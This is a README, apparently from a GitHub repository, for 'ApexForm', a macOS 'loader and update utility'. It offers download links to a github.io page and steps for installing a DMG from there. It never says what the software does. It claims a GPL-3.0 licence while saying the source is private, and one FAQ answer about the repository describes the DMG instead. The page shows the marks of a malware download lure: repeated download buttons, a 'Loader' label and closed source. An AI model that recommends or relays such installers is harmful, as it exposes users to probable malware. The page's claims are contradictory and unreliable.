# ApexForm - macOS Loader and Update Utility 2026

> **ApexForm is a macOS update utility built around Sparkle, appcast-based release checks, and direct DMG downloads for obtaining current versions.**

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-macOS-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonw58/apexform-loader-update?style=flat-square)](https://github.com/masonw58/apexform-loader-update)

---

<p align="center">
  <a href="https://masonw58.github.io/apexform-loader-update/">
    <img src="https://img.shields.io/badge/Download-ApexForm%20Loader-brightgreen?style=for-the-badge" alt="Download ApexForm Loader">
  </a>
</p>

> **[Download ApexForm Loader](https://masonw58.github.io/apexform-loader-update/)**

---

[Download Latest Build](https://masonw58.github.io/apexform-loader-update/)

---

## Overview

ApexForm relies on the Sparkle framework to monitor an appcast feed for new macOS releases. After a release is published, the feed identifies the available build and can send users to its matching package.

The project also supports users who want to install updates manually. DMG installers are made available through GitHub Releases, and the published packages are notarized. This creates a focused macOS distribution route without exposing or requiring access to the private source repository.

---

## Included Capabilities

- Automatic update checks powered by Sparkle
- Appcast-based release metadata distribution
- Direct downloads of DMG packages
- Notarized installers for macOS
- Published builds hosted through GitHub Releases
- Manual installation for users who bypass in-app updating
- One public repository for update and release distribution

---

## Installation and Updates

### Install the newest build

1. Visit the [ApexForm download page](https://masonw58.github.io/apexform-loader-update/).
2. Save the latest DMG installer.
3. Open the DMG in Finder once the download completes.
4. Complete the macOS installation steps for ApexForm.
5. Start ApexForm.

### Receive updates with Sparkle

If the configured appcast contains a newer release, ApexForm can show it through Sparkle. Use the prompts displayed in the application to download and install that release.

### Repository purpose

This repository serves as the public location for update information and downloadable builds. The ApexForm source repository is private, and a source checkout is not needed to install the application.

---

## Available Update Paths

| Channel | Delivery method | Intended use |
| --- | --- | --- |
| Latest | Sparkle appcast and direct DMG download | Current published ApexForm release |
| Manual | GitHub Releases DMG package | Users who want to choose and download a release themselves |
| Source | Not provided in this repository | ApexForm source remains private |

---

## Troubleshooting Guide

### The download page is unavailable

Verify that the address below is the current one:

[Open ApexForm Downloads](https://masonw58.github.io/apexform-loader-update/)

If it still cannot be reached, try again later or use the related GitHub Releases download when it is available.

### Sparkle does not detect a newer version

Check the Mac's network connection, then run the update check again. If no newer release appears in the appcast, obtain the latest available DMG manually from the public download page.

### macOS blocks the installer

Check that the DMG has downloaded completely. When macOS shows a confirmation or permission message, review the displayed information and the release source before continuing.

### The DMG will not mount

Delete the partial or damaged download and retrieve the package again. If the issue continues, try another browser or network connection in case the original transfer was interrupted.

### The installed application cannot be replaced

Quit ApexForm and repeat the installation. For a replacement install, ensure the application is not currently being launched from the mounted DMG.

---

## Frequently Asked Questions

### Will ApexForm update itself?

ApexForm can perform automatic update checks using Sparkle and an appcast feed. The application determines when those checks occur.

### Is Sparkle required for installation?

No. You can download a DMG directly from the [ApexForm download page](https://masonw58.github.io/apexform-loader-update/) or from its GitHub Releases location.

### What does this repository contain?

The DMG contains the macOS application package used for installation. This repository provides release packages and update metadata; it does not contain the private ApexForm source code.

### Are older releases available?

Earlier builds may be listed in GitHub Releases. When a previous DMG is published there, you can download and install it manually.

### How do I access update logs?

Diagnostic information may be available through Sparkle or macOS application and system logging tools. The amount of information shown depends on the installed ApexForm build and the current update status.

### What operating system does ApexForm support?

ApexForm is distributed for macOS. Compatibility can differ between releases, so check the details supplied with the specific DMG before installing it.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
